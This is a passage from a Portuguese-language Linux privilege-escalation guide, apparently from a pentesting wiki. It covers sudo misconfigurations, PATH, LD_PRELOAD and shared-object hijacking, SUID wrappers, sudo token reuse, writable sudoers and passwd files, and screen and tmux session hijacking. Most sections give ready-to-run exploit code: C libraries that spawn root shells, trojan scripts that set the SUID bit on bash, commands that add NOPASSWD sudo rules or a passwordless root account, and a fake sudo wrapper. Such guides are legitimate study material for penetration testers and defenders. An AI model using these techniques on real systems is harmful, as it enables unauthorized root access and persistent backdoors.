Em algumas distribuições antigas, o sudo pode ser configurado com `requiretty`, que força o sudo a ser executado somente em um TTY interativo. Se `!requiretty` estiver definido (ou a opção estiver ausente), o sudo pode ser executado em contextos não interativos, como reverse shells, tarefas do cron ou scripts.

```bash
Defaults !requiretty
```

Isso não é uma vulnerabilidade direta por si só, mas amplia as situações em que regras do sudo podem ser abusadas sem precisar de um PTY completo.

### Sudo env_keep+=PATH / secure_path inseguro → PATH hijack

Se `sudo -l` mostrar `env_keep+=PATH` ou um `secure_path` contendo entradas graváveis pelo atacante (por exemplo, `/home/<user>/bin`), um comando externo sem caminho completo no alvo permitido pelo sudo pode ser substituído.<sup>[[3]](#references)</sup> A ausência de um `secure_path` efetivo também merece análise **se** o ambiente do sudo preservar um `PATH` controlado pelo usuário que invocou o comando; a ausência, por si só, não prova que isso ocorra. Leia o script permitido sem executá-lo e, em seguida, verifique a regra exata de RunAs e dos argumentos, o caminho efetivo de busca de comandos e a existência de um diretório anterior gravável e acessível que contenha o nome do comando. A autenticação, `NOEXEC`, os comandos internos do shell e os caminhos absolutos para comandos podem alterar o resultado.

- Requisitos: uma regra do sudo (geralmente `NOPASSWD`) que execute um script/binário que chame comandos sem caminhos absolutos (`free`, `df`, `ps` etc.) e uma entrada gravável de PATH que seja pesquisada primeiro.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Bypass de caminhos na execução do Sudo
**Salte** para ler outros arquivos ou use **symlinks**. Por exemplo, no arquivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Se um **wildcard** for usado (\*), fica ainda mais fácil:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando Sudo/binário SUID sem caminho do comando

Se a **permissão sudo** for concedida para um único comando **sem especificar o caminho**: _hacker10 ALL= (root) less_, você pode explorá-la alterando a variável PATH.

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Essa técnica também pode ser usada se um binário **suid** **executar outro comando sem especificar o caminho até ele (sempre verifique o conteúdo de um binário SUID suspeito com** _**strings**_**)**.

[Exemplos de payloads para executar.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binário SUID com caminho do comando

Se o binário **suid** **executar outro comando especificando o caminho**, você pode tentar **exportar uma função** com o nome do comando que o arquivo suid está chamando.

Por exemplo, se um binário suid chamar _**/usr/sbin/service apache2 start**_, você deve tentar criar e exportar a função:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Então, quando você chamar o binário SUID, esta função será executada

### Wrappers personalizados de cópia SUID

Um utilitário SUID pertencente ao root que aceita caminhos de origem e destino pode cruzar dois limites de confiança diferentes. Se ele montar um comando de shell usando qualquer um dos argumentos (por exemplo, passando um comando `cp` montado para `system()`), metacaracteres do shell podem executar outro comando com os privilégios efetivos do utilitário. Mesmo que invoque `cp` com segurança, sem usar um shell, um destino irrestrito pode permitir gravações privilegiadas arbitrárias em arquivos como `/etc/passwd`. Analise o tratamento dos argumentos do wrapper, o comportamento do UID efetivo, as restrições do destino e se o arquivo copiado mantém conteúdo controlado pelo usuário; um erro genérico de `cp` ou o bit SUID, por si só, não comprova nenhum dos cenários. Antes de qualquer teste manual, enumere passivamente o binário e as permissões.

### Script gravável executado por um wrapper SUID

Uma configuração incorreta comum em aplicativos personalizados é um wrapper binário SUID pertencente ao root que executa um script, enquanto o próprio script pode ser gravado por usuários sem privilégios elevados.

Padrão típico:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Se `/usr/local/bin/backup.sh` tiver permissão de escrita, você pode adicionar comandos de payload e então executar o wrapper SUID:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Verificações rápidas:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Esse caminho de ataque é especialmente comum em wrappers de "maintenance"/"backup" distribuídos em `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

A variável de ambiente **LD_PRELOAD** é usada para especificar uma ou mais bibliotecas compartilhadas (arquivos .so) a serem carregadas pelo loader antes de todas as outras, incluindo a biblioteca C padrão (`libc.so`). Esse processo é conhecido como preloading de uma biblioteca.

No entanto, para manter a segurança do sistema e impedir que esse recurso seja explorado, especialmente com executáveis **suid/sgid**, o sistema impõe algumas condições:

- O loader ignora **LD_PRELOAD** em executáveis nos quais o ID real do usuário (_ruid_) não corresponde ao ID efetivo do usuário (_euid_).
- Para executáveis com suid/sgid, somente bibliotecas em caminhos padrão que também tenham suid/sgid são pré-carregadas.

A escalada de privilégios pode ocorrer se você tiver a capacidade de executar comandos com `sudo` e a saída de `sudo -l` incluir a instrução **env_keep+=LD_PRELOAD**. Essa configuração permite que a variável de ambiente **LD_PRELOAD** persista e seja reconhecida mesmo quando comandos são executados com `sudo`, podendo levar à execução de código arbitrário com privilégios elevados.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Salve como **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Em seguida, **compile-o** usando:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Por fim, **eleve os privilégios** executando

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Um privesc semelhante pode ser explorado se o atacante controlar a variável de ambiente **LD_LIBRARY_PATH**, pois ele controla o caminho onde as bibliotecas serão procuradas.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### Binário SUID – .so injection

Ao encontrar um binário com permissões **SUID** que pareça incomum, é uma boa prática verificar se ele está carregando arquivos **.so** corretamente. Isso pode ser verificado executando o seguinte comando:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Por exemplo, encontrar um erro como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugere uma possível oportunidade de exploit.

Para realizar o exploit, seria preciso criar um arquivo C, por exemplo _"/path/to/.config/libcalc.c"_, contendo o seguinte código:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Este código, depois de compilado e executado, busca elevar privilégios manipulando permissões de arquivos e executando um shell com privilégios elevados.

Compile o arquivo C acima em uma biblioteca compartilhada (.so) usando:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Por fim, executar o binário SUID afetado deve acionar o exploit, permitindo um possível comprometimento do sistema.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Agora que encontramos um binário SUID carregando uma biblioteca de uma pasta na qual podemos escrever, vamos criar a biblioteca nessa pasta com o nome necessário:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Se você receber um erro como

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

isso significa que a biblioteca que você gerou precisa ter uma função chamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) é uma lista selecionada de binários Unix que podem ser explorados por um atacante para contornar restrições de segurança locais. [**GTFOArgs**](https://gtfoargs.github.io/) é o mesmo, mas para casos em que você pode **injetar apenas argumentos** em um comando.

O projeto reúne funções legítimas de binários Unix que podem ser abusadas para escapar de shells restritos, escalar ou manter privilégios elevados, transferir arquivos, iniciar bind shells e reverse shells e facilitar outras tarefas de pós-exploração.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Se você puder acessar `sudo -l`, poderá usar a ferramenta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para verificar se ela encontra uma forma de explorar alguma regra do sudo.

### Reutilizando tokens do sudo

Nos casos em que você tem **acesso ao sudo**, mas não tem a senha, pode escalar privilégios **aguardando a execução de um comando sudo e, em seguida, sequestrando o token da sessão**.<sup>[[18]](#references)</sup>

Requisitos para escalar privilégios:

- Você já tem um shell como usuário "_sampleuser_"
- "_sampleuser_" **usou `sudo`** para executar algo nos **últimos 15 minutos** (por padrão, essa é a duração do token do sudo que permite usar `sudo` sem informar uma senha)
- `cat /proc/sys/kernel/yama/ptrace_scope` é 0
- `gdb` está acessível (você deve conseguir fazer upload dele)

(Você pode habilitar temporariamente `ptrace_scope` com `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou modificando permanentemente `/etc/sysctl.d/10-ptrace.conf` e definindo `kernel.yama.ptrace_scope = 0`.)

Se todos esses requisitos forem atendidos, **você pode escalar privilégios usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- O **primeiro exploit** (`exploit.sh`) criará o binário `activate_sudo_token` em _/tmp_. Você pode usá-lo para **ativar o token do sudo na sua sessão** (você não obterá automaticamente um shell root; execute `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- O **segundo exploit** (`exploit_v2.sh`) criará um shell sh em _/tmp_ **de propriedade do root com setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- O **terceiro exploit** (`exploit_v3.sh`) vai **criar um arquivo sudoers** que torna os **tokens do sudo eternos e permite que todos os usuários usem sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Se você tiver **permissões de escrita** na pasta ou em qualquer um dos arquivos criados dentro dela, poderá usar o binário [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **criar um token sudo para um usuário e PID**.\
Por exemplo, se você puder sobrescrever o arquivo _/var/run/sudo/ts/sampleuser_ e tiver um shell como esse usuário com PID 1234, poderá **obter privilégios sudo** sem precisar saber a senha, fazendo:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

O arquivo `/etc/sudoers` e os arquivos dentro de `/etc/sudoers.d` configuram quem pode usar `sudo` e como. Por padrão, esses arquivos **só podem ser lidos pelo usuário root e pelo grupo root**.\
**Se** você puder **ler** esse arquivo, poderá **obter informações interessantes**; e, se puder **escrever** em qualquer arquivo, poderá **escalar privilégios**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Se você pode escrever, pode abusar dessa permissão.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Outra forma de abusar dessas permissões:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Existem algumas alternativas ao binário `sudo`, como `doas` para OpenBSD. Lembre-se de verificar sua configuração em `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Se `doas` permitir um editor ou interpretador, verifique escapes no estilo GTFOBins:

```bash
doas vim
:!/bin/sh
```

Uma regra `doas` com capacidade de executar como root para o `dstat` original, baseado em Python, também merece uma revisão do caminho dos plugins. O [manual](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) e o [código-fonte](https://github.com/dstat-real/dstat/blob/master/dstat) listam `/usr/share/dstat/` e `/usr/local/share/dstat/` entre os locais dos plugins `dstat_*.py`. Se o usuário atual puder gravar em um local realmente usado pela versão instalada e percorrê-lo, um plugin selecionado poderá ser executado com a identidade RunAs do `doas`. Confirme a regra efetiva, a busca de plugins nessa versão, as permissões ou ACLs do diretório e dos diretórios pais, e se o usuário pode selecionar um plugin; uma regra `dstat` ou um diretório gravável, por si só, é apenas uma pista. Outras implementações do `dstat` podem usar sistemas de plugins diferentes. Inspecione os metadados passivamente, sem carregar um plugin.

### Sudo Hijacking

Se você sabe que um **usuário costuma se conectar a uma máquina e usar `sudo`** para escalar privilégios e conseguiu um shell no contexto desse usuário, pode **criar um novo executável `sudo`** que executará seu código como root e, em seguida, o comando do usuário. Depois, **modifique o $PATH** do contexto do usuário (por exemplo, adicionando o novo caminho a `.bash_profile`) para que, quando o usuário executar `sudo`, seu executável `sudo` seja executado.

Observe que, se o usuário usar um shell diferente (que não seja bash), você precisará modificar outros arquivos para adicionar o novo caminho. Por exemplo, o [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Você pode encontrar outro exemplo em [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ou executando algo como:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Biblioteca compartilhada

### ld.so

O arquivo `/etc/ld.so.conf` indica **de onde vêm os arquivos de configuração carregados**. Normalmente, esse arquivo contém o seguinte caminho: `include /etc/ld.so.conf.d/*.conf`

Isso significa que os arquivos de configuração de `/etc/ld.so.conf.d/*.conf` serão lidos. Esses arquivos de configuração **apontam para outras pastas** nas quais as **bibliotecas** serão **procuradas**. Por exemplo, o conteúdo de `/etc/ld.so.conf.d/libc.conf` é `/usr/local/lib`. **Isso significa que o sistema procurará bibliotecas dentro de `/usr/local/lib`**.

Se, por algum motivo, **um usuário tiver permissões de escrita** em qualquer um dos caminhos indicados: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, qualquer arquivo dentro de `/etc/ld.so.conf.d/` ou qualquer pasta indicada no arquivo de configuração dentro de `/etc/ld.so.conf.d/*.conf`, ele poderá conseguir elevar privilégios.\
Confira **como explorar essa configuração incorreta** na página a seguir:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Ao copiar a lib para `/var/tmp/flag15/`, ela será usada pelo programa nesse local, conforme especificado na variável `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Em seguida, crie uma biblioteca maliciosa em `/var/tmp` com `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

As capabilities do Linux fornecem **um subconjunto dos privilégios de root disponíveis a um processo**. Isso efetivamente divide os **privilégios de root em unidades menores e distintas**. Cada uma dessas unidades pode então ser concedida a processos de forma independente. Dessa forma, o conjunto completo de privilégios é reduzido, diminuindo os riscos de exploração.\
Leia a página a seguir para **saber mais sobre capabilities e como abusar delas**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

Em um diretório, o **bit de "execução"** implica que o usuário afetado pode "**cd**" para a pasta.\
O bit de **"leitura"** implica que o usuário pode **listar** os **arquivos**, e o bit de **"escrita"** implica que o usuário pode **excluir** e **criar** novos **arquivos**.

## ACLs

As Access Control Lists (ACLs) representam a camada secundária de permissões discricionárias, capaz de **substituir as permissões ugo/rwx tradicionais**. Essas permissões aprimoram o controle sobre o acesso a arquivos ou diretórios, permitindo ou negando direitos a usuários específicos que não são os proprietários nem fazem parte do grupo. Esse nível de **granularidade garante um gerenciamento de acesso mais preciso**. Mais detalhes podem ser encontrados [**aqui**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Conceda** ao usuário "kali" permissões de leitura e escrita em um arquivo:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Obtenha** arquivos com ACLs específicas do sistema:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Backdoor de ACL oculta em arquivos adicionais do sudoers

Uma configuração incorreta comum é um arquivo em `/etc/sudoers.d/` pertencente ao root, com modo `440`, que ainda concede acesso de escrita a um usuário de baixo privilégio por meio de uma ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Se você vir algo como `user:alice:rw-`, o usuário pode adicionar uma regra do sudo, apesar dos bits de modo restritivos:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Este é um caminho de persistência/privesc com ACL de alto impacto, pois é fácil não percebê-lo em revisões que usam apenas `ls -l`.

## Sessões de shell abertas

O acesso entre usuários ao GNU Screen depende da **configuração e da ACL da sessão em execução**, não apenas da versão. [A documentação do GNU Screen](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) informa que ele deve ser compilado com suporte a multiusuário; `multiuser on` e uma concessão `acladd` ou `aclchg` adequada permitem que outro usuário se conecte. [O manual também exige setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) para a busca de sessões entre usuários. Um socket visível de propriedade do root ou um binário `screen` com SUID, por si só, não comprovam que seja possível conectar-se a um shell do root. Confirme que a sessão ativa está no modo multiusuário, que o usuário atual tem permissão efetiva para inserir comandos e que o shell nessa sessão é executado como o proprietário privilegiado antes de considerá-la uma escalada.

### Hijacking de sessões do screen

**Listar sessões do screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![sequestro de sessões do screen - Locais dos sockets (alguns sistemas disponibilizam um como link simbólico do outro): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Conectar-se a uma sessão**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## hijacking de sessões do tmux

Isso era um problema nas **versões antigas do tmux**. Não consegui fazer hijack de uma sessão do tmux (v2.1) criada pelo root como usuário sem privilégios.

**Listar sessões do tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Localizações dos sockets (alguns sistemas expõem um como link simbólico do outro) - sequestro de sessões tmux: tmux -S /tmp/dev sess ls Listar usando esse socket; você pode iniciar uma sessão tmux nesse socket...](<../../images/image (837).png>)

**Anexar a uma sessão**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Confira **Valentine box from HTB** para ver um exemplo.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Chaves geradas com versões afetadas do OpenSSL do Debian ou de derivados durante o período vulnerável histórico podem ter aleatoriedade previsível; a distribuição atual do host ou a versão corrigida do OpenSSL não permite determinar como uma chave antiga foi gerada. Verifique a **chave específica** usando uma lista de bloqueio histórica adequada e confira sua procedência. O manual [`ssh-vulnkey` manual](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) do Debian descreve como verificar chaves públicas e `authorized_keys`, e [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) registra a correção do OpenSSL. Uma entrada em `authorized_keys` de uma conta privilegiada é apenas uma pista de escalonamento se a chave privada correspondente puder ser recuperada e a política SSH efetiva ainda aceitar essa chave para essa conta; uma chave de **host** fraca não é, por si só, uma credencial de login. Substitua as chaves comprometidas e remova as autorizações antigas.

### Valores de configuração SSH interessantes

- **PasswordAuthentication:** Especifica se a autenticação por senha é permitida. O padrão do OpenSSH upstream é `yes`; a configuração da distribuição pode sobrescrevê-lo.
- **PubkeyAuthentication:** Especifica se a autenticação por chave pública é permitida. O padrão é `yes`.
- **PermitEmptyPasswords**: Quando a autenticação por senha é permitida, especifica se o servidor permite login em contas com senhas vazias. O padrão é `no`.

### Arquivos de controle de login

Estes arquivos influenciam quem pode fazer login e como:

- **`/etc/nologin`**: se existir, bloqueia logins de usuários que não sejam root e exibe sua mensagem.
- **`/etc/securetty`**: restringe onde root pode fazer login (lista de permissões de TTY).
- **`/etc/motd`**: banner exibido após o login (pode vazar informações sobre o ambiente ou detalhes de manutenção).

### PermitRootLogin

Especifica se root pode fazer login usando ssh. O padrão do OpenSSH upstream é `prohibit-password`; a configuração da distribuição pode sobrescrevê-lo. Valores possíveis:

- `yes`: root pode fazer login usando senha e chave privada
- `without-password` ou `prohibit-password`: root só pode fazer login com uma chave privada
- `forced-commands-only`: root só pode fazer login usando uma chave privada e se as opções de comandos estiverem especificadas
- `no` : não

### Autoridades de certificação confiáveis para certificados SSH de usuário

`TrustedUserCAKeys` indica as chaves públicas em que o sshd confia para assinar certificados de **usuário**. Se a chave privada da CA correspondente puder ser lida por um usuário com menos privilégios, verifique quem pode obter um certificado e com quais principals de conta ele poderia se autenticar. `AuthorizedPrincipalsFile` ou `AuthorizedPrincipalsCommand` podem restringir os nomes aceitos; se nenhum dos dois estiver configurado, o certificado precisa conter o nome da conta de destino. `PermitRootLogin prohibit-password` bloqueia a autenticação de root por senha, mas ainda pode permitir a autenticação por certificado. A exposição de um caminho de chave, por si só, não comprova acesso: confirme o par de chaves pública/privada, as regras `Match` efetivas, a política da conta, a senha da chave, a revogação e os algoritmos de assinatura aceitos. Não inclua bytes de chaves privadas na saída de enumeração. Consulte o [OpenSSH server configuration manual](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Uma chave privada de CA também pode ser usada **sem estar legível** para o usuário atual caso uma regra de delegação de privilégios permita que esse usuário invoque um [signatário de certificados irrestrito, como `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s), usando a identidade do proprietário da chave. Correlacione o comando e os argumentos exatos permitidos com o acesso do signatário à chave, a CA pública confiável pela configuração efetiva do sshd, o principal aceito para a conta de destino, a validade do certificado e a política de login dessa conta. Um comando de assinatura delegado ou um arquivo de CA confiável, por si só, não comprova acesso a outra conta; não assine um certificado de teste durante a enumeração passiva.

### AuthorizedKeysFile

Especifica os arquivos que contêm as chaves públicas que podem ser usadas para autenticação de usuários. Pode conter tokens como `%h`, que serão substituídos pelo diretório home. **Você pode indicar caminhos absolutos** (começando com `/`) ou **caminhos relativos ao diretório home do usuário**. Por exemplo:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Essa configuração indica que, se você tentar fazer login com a chave **privada** do usuário "**testusername**", o ssh vai comparar a chave pública da sua chave com as que estão em `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

O encaminhamento do agente SSH permite **usar suas chaves SSH locais em vez de deixar as chaves** (sem passphrases!) armazenadas no servidor. Assim, você poderá **jump** via ssh **para um host** e, a partir dele, **jump para outro** host **usando** a **chave** localizada no seu **host inicial**.

Você precisa definir essa opção em `$HOME/.ssh.config` assim:

```
Host example.com
  ForwardAgent yes
```

Observe que, se `Host` for `*`, sempre que o usuário acessar outra máquina, esse host poderá acessar as chaves (o que é um problema de segurança).

O arquivo `/etc/ssh_config` pode **sobrescrever** essas **opções** e permitir ou negar essa configuração.\
O arquivo `/etc/sshd_config` pode **permitir** ou **negar** o encaminhamento do ssh-agent com a palavra-chave `AllowAgentForwarding` (o padrão é permitir).

Se você descobrir que o Forward Agent está configurado em um ambiente, leia a página a seguir, pois **talvez você possa abusar disso para escalar privilégios**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Arquivos interessantes

### Arquivos de perfil

O arquivo `/etc/profile` e os arquivos em `/etc/profile.d/` são **scripts executados quando um usuário inicia um novo shell**. Portanto, se você puder **escrever ou modificar qualquer um deles, poderá escalar privilégios**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Se algum script de perfil estranho for encontrado, você deve verificá-lo em busca de **informações confidenciais**.

### Arquivos Passwd/Shadow

Dependendo do sistema operacional, os arquivos `/etc/passwd` e `/etc/shadow` podem ter nomes diferentes ou pode haver um backup. Portanto, recomenda-se **encontrar todos eles** e **verificar se você consegue lê-los** para ver **se há hashes** dentro dos arquivos:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Em algumas ocasiões, você pode encontrar **hashes de senhas** no arquivo `/etc/passwd` (ou equivalente)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### /etc/passwd gravável

Primeiro, gere uma senha com um dos seguintes comandos.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Em seguida, adicione o usuário `hacker` e defina a senha gerada.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Por exemplo: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Agora você pode usar o comando `su` com `hacker:hacker`

Como alternativa, você pode usar as linhas a seguir para adicionar um usuário fictício sem senha.\
AVISO: isso pode reduzir a segurança atual da máquina.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOTA: Em plataformas BSD, `/etc/passwd` fica em `/etc/pwd.db` e `/etc/master.passwd`; além disso, `/etc/shadow` é renomeado para `/etc/spwd.db`.

Você deve verificar se consegue **escrever em alguns arquivos sensíveis**. Por exemplo, consegue escrever em algum **arquivo de configuração de serviço**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Por exemplo, se a máquina estiver executando um servidor **tomcat** e você puder **modificar o arquivo de configuração do serviço Tomcat dentro de /etc/systemd/,** então poderá modificar as linhas:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Seu backdoor será executado na próxima vez que o Tomcat for iniciado.

### Verifique as pastas

As pastas a seguir podem conter backups ou informações interessantes: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Provavelmente você não conseguirá ler a última, mas tente)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Localizações incomuns/arquivos de propriedade

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
